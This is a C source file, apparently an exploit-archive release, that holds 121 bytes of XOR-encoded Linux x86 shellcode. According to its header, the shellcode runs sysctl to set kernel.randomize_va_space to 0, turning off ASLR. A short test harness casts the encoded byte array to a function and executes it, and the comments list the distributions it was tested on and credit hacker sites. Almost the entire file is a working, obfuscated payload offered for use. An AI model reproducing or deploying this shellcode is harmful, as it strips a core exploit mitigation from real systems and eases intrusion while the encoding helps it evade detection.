/*
 * sys_execve("/sbin/sysctl", { "/sbin/sysctl", "-w", "kernel.randomize_va_space=0" }, NULL) 121 bytes polymorphic shellcode
 *
 * tesla_ (gandung@ppp.cylab.cmu.edu)
 */

/*
 * Tested in : 
 * - BackTrack 5 (linux-2.6.38-generic)
 * - Ubuntu 10.10 Maverick Meerkat (linux-2.6.38-generic)
 * - Ubuntu 11.04 Natty Narwhal
 * - Debian Squeeze 6.0.2 (linux-2.6.32-5-stable)
 */

#include <stdio.h>
#include <string.h>

char null_space[] = "\xeb\x0d\x5e\x31\xc9\xb1\x65\x80\x36\x7e"
		    "\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff"
		    "\x4f\xbe\xfd\x92\x7f\xf6\x7a\x5a\x16\x1d"
		    "\x1b\x43\x4e\x16\x21\x0d\x0e\x1f\x16\x1b"
		    "\x21\x08\x1f\x16\x11\x13\x17\x04\x16\x0c"
		    "\x1f\x10\x1a\x16\x10\x1b\x12\x50\x18\x16"
		    "\x1b\x0c\xfd\x92\x7f\xb8\x7a\x5a\x15\xf7"
		    "\x98\xfd\x92\x7f\xf6\x7a\x5a\x18\x16\x53"
		    "\x09\xfd\x92\x7f\xf6\x7a\x5a\x16\x0d\x1d"
		    "\x0a\x12\x16\x10\x51\x0d\x07\x16\x51\x0d"
		    "\x1c\x17\xf7\x9d\x2e\x28\x2d\xce\x75\xf7"
		    "\x9f\x4f\xac\xb3\xfe\x4f\xbe\xce\x7f\xb3"
		    "\xfe";

int main(void) {
  int null_len = strlen(null_space);
  printf("[+] Using key mutation engine : 0x7e\n");
  printf("[+] Length of this shellcode : %d bytes\n", null_len);
  printf("[+] After executing this code, please check the value of \"/proc/sys/kernel/randomize_va_space\"\n");
  (*(void(*)())null_space)();
  return 0;
}

/* devilzc0de.org, hacker-newbie.org, sdf.lonestar.org, 1337day.com */